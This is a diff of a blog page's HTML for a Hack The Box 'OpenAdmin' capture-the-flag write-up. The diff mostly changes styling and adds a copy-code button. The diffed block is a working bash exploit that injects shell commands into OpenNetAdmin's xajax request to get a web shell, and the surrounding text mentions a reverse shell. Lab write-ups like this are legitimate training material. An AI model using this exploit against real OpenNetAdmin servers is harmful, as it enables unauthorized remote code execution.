@@ -2,7 +2,7 @@
 <html lang="en">
   <head>
     <title>
-        Hackthebox - OpenAdmin Writeup - A personal cybersecurity blog
+        Hackthebox - OpenAdmin Writeup - fmash16&#39;s blog
       </title>
         <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
@@ -21,10 +21,10 @@
     
     <meta name="description" content="Difficulty : easy, topics: php, gtfobins, opennetadmin" />
     <meta name="generator" content="Hugo 0.71.0 with theme pure" />
-    <title>Hackthebox - OpenAdmin Writeup - A personal cybersecurity blog</title>
+    <title>Hackthebox - OpenAdmin Writeup - fmash16&#39;s blog</title>
     
     
-    <link rel="stylesheet" href="/css/style.min.d25af0bab4d33793898dbd0b3c2137b1b04a01c67b4d3321370361298f0ae3de.css">
+    <link rel="stylesheet" href="/css/style.min.bef22498336108fd63d73af3a80f7d93e90f4ab8174c15d0ce0fe149dcf0312b.css">
     
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css" async>
     <meta property="og:title" content="Hackthebox - OpenAdmin Writeup" />
@@ -457,16 +457,16 @@ http://10.10.10.171/ona/</p>
 <p>Searching for exploits for OpenNetAdmin, we find a remote code execution
 vulnerability on exploit-db. (<a href="https://www.exploit-db.com/exploits/47691">https://www.exploit-db.com/exploits/47691</a>)
 We download the exploit and change it according to our needs.</p>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span style="color:#776e71">#! /bin/bash
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span style="color:#776e71"></span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span style="color:#ef6155">URL</span><span style="color:#5bc4bf">=</span><span style="color:#48b685">&#34;</span><span style="color:#f99b15">${</span><span style="color:#ef6155">1</span><span style="color:#f99b15">}</span><span style="color:#48b685">&#34;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span style="color:#815ba4">while</span> true;<span style="color:#815ba4">do</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span> echo -n <span style="color:#48b685">&#34;</span>$<span style="color:#48b685"> &#34;</span>; read cmd
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span> curl --silent -d
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span style="color:#48b685">&#34;xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span style="color:#48b685">\&#34;BEGIN\&#34;;</span><span style="color:#f99b15">${</span><span style="color:#ef6155">cmd</span><span style="color:#f99b15">}</span><span style="color:#48b685">;echo \&#34;END\&#34;&amp;xajaxargs[]=ping&#34;</span> <span style="color:#48b685">&#34;</span><span style="color:#f99b15">${</span><span style="color:#ef6155">URL</span><span style="color:#f99b15">}</span><span style="color:#48b685">&#34;</span> | sed -n -e
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span style="color:#48b685">&#39;/BEGIN/,/END/ p&#39;</span> | tail -n +2 | head -n -1
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span style="color:#815ba4">done</span>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 1</span><span style="color:#cd2828;font-weight:bold">#! /bin/bash
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 2</span><span style="color:#cd2828;font-weight:bold"></span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 3</span><span style="color:#40ffff">URL</span>=<span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">${</span><span style="color:#40ffff">1</span><span style="color:#ed9d13">}</span><span style="color:#ed9d13">&#34;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 4</span><span style="color:#6ab825;font-weight:bold">while</span> true;<span style="color:#6ab825;font-weight:bold">do</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 5</span> <span style="color:#24909d">echo</span> -n <span style="color:#ed9d13">&#34;</span>$<span style="color:#ed9d13"> &#34;</span>; <span style="color:#24909d">read</span> cmd
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 6</span> curl --silent -d
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 7</span><span style="color:#ed9d13">&#34;xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 8</span><span style="color:#ed9d13">\&#34;BEGIN\&#34;;</span><span style="color:#ed9d13">${</span><span style="color:#40ffff">cmd</span><span style="color:#ed9d13">}</span><span style="color:#ed9d13">;echo \&#34;END\&#34;&amp;xajaxargs[]=ping&#34;</span> <span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">${</span><span style="color:#40ffff">URL</span><span style="color:#ed9d13">}</span><span style="color:#ed9d13">&#34;</span> | sed -n -e
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 9</span><span style="color:#ed9d13">&#39;/BEGIN/,/END/ p&#39;</span> | tail -n +2 | head -n -1
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">10</span><span style="color:#6ab825;font-weight:bold">done</span>
 </code></pre></div><p>We run the exploit to get a web shell</p>
 <p><img src="/img/htb_openadmin/5.png" alt=""></p>
 <p>We try getting a reverse shell to get a more interactive shell.</p>
@@ -695,6 +695,64 @@ reset; sh 1&gt;&amp;0 2&gt;&amp;0
         
         hasInnerContainers: true,
     });
+</script>
+
+
+/* copy code button */
+<script>
+function addCopyButtons(clipboard) {
+    document.querySelectorAll('pre > code').forEach(function (codeBlock) {
+        var button = document.createElement('button');
+        button.className = 'copy-code-button';
+        button.type = 'button';
+        button.innerText = 'Copy';
+
+        button.addEventListener('click', function () {
+              
+            tmp = codeBlock.innerText.split("\n");
+            cutChar = (tmp.length>8) ? 2 : 1;
+            for(i=0; i<tmp.length; i++){
+              tmp[i] = tmp[i].substring(cutChar);
+            }
+            block = tmp.join("\n");
+            clipboard.writeText(block).then(function () {
+                
+
+                button.blur();
+
+                button.innerText = 'Copied!';
+
+                setTimeout(function () {
+                    button.innerText = 'Copy';
+                }, 2000);
+            }, function (error) {
+                button.innerText = 'Error';
+            });
+        });
+
+        var pre = codeBlock.parentNode;
+        if (pre.parentNode.classList.contains('highlight')) {
+            var highlight = pre.parentNode;
+            highlight.parentNode.insertBefore(button, highlight);
+        } else {
+            pre.parentNode.insertBefore(button, pre);
+        }
+    });
+}
+if (navigator && navigator.clipboard) {
+    addCopyButtons(navigator.clipboard);
+} else {
+    var script = document.createElement('script');
+    script.src = 'https://cdnjs.cloudflare.com/ajax/libs/clipboard-polyfill/2.7.0/clipboard-polyfill.promise.js';
+    script.integrity = 'sha256-waClS2re9NUbXRsryKoof+F9qc1gjjIhc2eT7ZbIv94=';
+    script.crossOrigin = 'anonymous';
+    script.onload = function() {
+        addCopyButtons(clipboard);
+    };
+
+    document.body.appendChild(script);
+}
+
 </script>
 
 
